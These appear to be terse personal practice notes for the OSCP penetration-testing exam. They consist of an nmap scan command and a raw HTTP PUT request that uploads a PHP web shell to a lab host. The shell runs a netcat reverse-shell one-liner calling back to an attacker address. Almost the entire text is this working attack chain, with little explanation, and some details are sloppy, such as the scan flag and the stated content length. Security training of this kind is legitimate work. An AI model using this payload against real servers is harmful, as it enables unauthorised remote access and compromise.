# OSCP_Practice

test


nmap -SV -p- 192.168.1.107

use burp to inves by
====================================
PUT /test/shell.php HTTP/1.1
Host: 192.168.1.108
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 11

<?php echo shell_exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.43.2 443 >/tmp/f"); ?>
====================================
